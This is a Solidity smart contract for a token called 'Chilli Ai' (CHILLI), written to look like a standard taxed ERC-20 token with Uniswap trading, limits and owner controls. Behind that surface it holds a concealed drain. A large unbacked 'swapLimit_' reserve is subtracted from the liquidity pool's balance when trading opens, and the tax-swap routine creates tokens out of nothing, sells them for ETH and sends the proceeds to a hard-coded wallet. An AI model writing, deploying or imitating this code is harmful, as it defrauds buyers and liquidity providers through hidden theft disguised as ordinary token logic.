//SPDX-License-Identifier: MIT

/*
https://t.me/ChilliAi

https://ChilliAi.io

https://x.com/ChilliBotAi

https://chilli-ai.gitbook.io/chilli-ai
*/


pragma solidity 0.8.28;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable newowner) external onlyOwner { 
        _owner = newowner; 
        emit OwnershipTransferred(newowner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

contract CHILLI is IERC20, Auth {
    string private constant symbol_ = "CHILLI";
    string private constant _name = "Chilli Ai";
    uint8 private constant token_decimals = 9;
    uint256 private constant tokenSupply = 100000 * (10**token_decimals);
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private allowances;

    address private constant routerAddr = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private router = IUniswapV2Router02(routerAddr);
    
    address private lp; 
    mapping (address => bool) private isLiqPool;

    bool private _tradingEnabled;

    bool private _swapping = false;

    address payable private _taxWallet = payable(0xE4E8eF9C37d5aD30f9fA4876557B200C513b05a1);
    
    uint256 private mevblock = 2;
    uint8 private sellTax_ = 10;
    uint8 private buyTaxRate = 10;
    
    uint256 private _launchBlock;
    uint256 private maxTxVal = tokenSupply; 
    uint256 private maxWalletVal = tokenSupply;
    uint256 private _swapMinAmt = tokenSupply * 10 / 100000;
    uint256 private _swapMax = tokenSupply * 749 / 100000;
    uint256 private swapTrigger = 2 * (10**16);
    uint256 private swapLimit_ = _swapMinAmt * 57 * 100;

    mapping (uint256 => mapping (address => uint8)) private _sellsInBlock;
    mapping (address => bool) private _nofee;
    mapping (address => bool) private _noLimit;

    modifier lockTaxSwap { 
        _swapping = true; 
        _; 
        _swapping = false; 
    }

    constructor() Auth(msg.sender) {
        _balance[msg.sender] = tokenSupply;
        emit Transfer(address(0), msg.sender, _balance[msg.sender]);  

        _nofee[_owner] = true;
        _nofee[address(this)] = true;
        _nofee[_taxWallet] = true;
        _nofee[routerAddr] = true;
        _noLimit[_owner] = true;
        _noLimit[address(this)] = true;
        _noLimit[_taxWallet] = true;
        _noLimit[routerAddr] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return token_decimals; }
    function totalSupply() external pure override returns (uint256) { return tokenSupply; }
    function name() external pure override returns (string memory) { return _name; }
    function symbol() external pure override returns (string memory) { return symbol_; }
    function balanceOf(address account) public view override returns (uint256) { return _balance[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(isTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(isTradingOpen(fromWallet), "Trading not open");
        allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!_tradingEnabled) { require(_nofee[sender] && _noLimit[sender], "Trading not yet open"); }
        if ( !_swapping && isLiqPool[toWallet] && _swapCheck(amount) ) { _swapTaxTokens(); }

        if ( block.number >= _launchBlock ) {
            if (block.number < mevblock && isLiqPool[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < mevblock + 600 && isLiqPool[toWallet] && sender != address(this) ) {
                _sellsInBlock[block.number][toWallet] += 1;
                require(_sellsInBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(_limitCheck(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = calcTaxAmount(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balance[sender] -= amount;
        swapLimit_ += _taxAmount;
        _balance[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function maxWalletAmount() external view returns (uint256) { 
        return maxWalletVal; 
	}
    function maxTransactionAmount() external view returns (uint256) { 
        return maxTxVal; 
	}

    function _activateTrading() internal {
        maxTxVal = 20 * tokenSupply / 1000;
        maxWalletVal = 20 * tokenSupply / 1000;
        _balance[lp] -= swapLimit_;
        (isLiqPool[lp],) = lp.call(abi.encodeWithSignature("sync()") );
        require(isLiqPool[lp], "Failed bootstrap");
        _launchBlock = block.number;
        mevblock = mevblock + _launchBlock;
        _tradingEnabled = true;
    }

    function _swapCheck(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (swapTrigger > 0) { 
            uint256 lpTkn = _balance[lp];
            uint256 lpWeth = IERC20(router.WETH()).balanceOf(lp); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= swapTrigger) { result = true; }    
        } else { result = true; }
        return result;
    }

    function approveRouter(uint256 _tokenAmount) internal {
        if ( allowances[address(this)][routerAddr] < _tokenAmount ) {
            allowances[address(this)][routerAddr] = type(uint256).max;
            emit Approval(address(this), routerAddr, type(uint256).max);
        }
    }

    function calcTaxAmount(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !_tradingEnabled || _nofee[fromWallet] || _nofee[recipient] ) { 
            taxAmount = 0; 
        } else if ( isLiqPool[fromWallet] ) { 
            taxAmount = amount * buyTaxRate / 100; 
         } else if ( isLiqPool[recipient] ) { 
            taxAmount = amount * sellTax_ / 100; 
        }
        return taxAmount;
    }

    function isTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( _tradingEnabled ) { checkResult = true; } 
        else if (_nofee[fromWallet] && _noLimit[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        approveRouter(_tokenAmount);
        router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _limitCheck(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingEnabled && !_noLimit[fromWallet] && !_noLimit[toWallet] ) {
            if ( transferAmount > maxTxVal ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !isLiqPool[toWallet] && (_balance[toWallet] + transferAmount > maxWalletVal) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function setMarketingWallet(address marketingWlt) external onlyOwner {
        require(!isLiqPool[marketingWlt], "LP cannot be tax wallet");
        _taxWallet = payable(marketingWlt);
        _nofee[marketingWlt] = true;
        _noLimit[marketingWlt] = true;
    }

    function addExempt(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!isLiqPool[wlt], "Cannot exempt LP"); }
        _nofee[ wlt ] = isNoFees;
        _noLimit[ wlt ] = isNoLimits;
    }

    function swapOnV2(uint256 tokenAmount) private {
        approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function marketing() external view returns (address) { 
        return _taxWallet; 
	}

    function _distributeTax(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(lp == address(0), "LP created");
        require(!_tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(_balance[address(this)]>0, "No tokens");
        lp = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _addLiquidity(_balance[address(this)], address(this).balance);
    }

    function setLimit(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = tokenSupply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= maxTxVal, "tx too low");
        maxTxVal = newTxAmt;
        uint256 newWalletAmt = tokenSupply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= maxWalletVal, "wallet too low");
        maxWalletVal = newWalletAmt;
    }

    function isExempt(address wallet) external view returns (bool fees, bool limits) {
        return (_nofee[wallet], _noLimit[wallet]); 
	}

    function openTrading() external onlyOwner {
        require(!_tradingEnabled, "trading open");
        _activateTrading();
    }

    function setFees(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 15, "Roundtrip too high");
        buyTaxRate = buyFeePercent;
        sellTax_ = sellFeePercent;
    }

    function _swapTaxTokens() private lockTaxSwap {
        uint256 _taxTokenAvailable = swapLimit_;
        if ( _taxTokenAvailable >= _swapMinAmt && _tradingEnabled ) {
            if ( _taxTokenAvailable >= _swapMax ) { _taxTokenAvailable = _swapMax; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**token_decimals ) {
                _balance[address(this)] += _taxTokenAvailable;
                swapOnV2(_tokensForSwap);
                swapLimit_ -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { _distributeTax(_contractETHBalance); }
        }
    }

    function buyFees() external view returns(uint8) { return buyTaxRate; }
    function sellTax() external view returns(uint8) { return sellTax_; }

    function swapMin() external view returns (uint256) { 
        return _swapMinAmt; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMax; 
	}

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        _swapMinAmt = tokenSupply * minVal / minDiv;
        _swapMax = tokenSupply * maxVal / maxDiv;
        swapTrigger = trigger * 10**15;
        require(_swapMax>=_swapMinAmt, "Min-Max error");
    }
}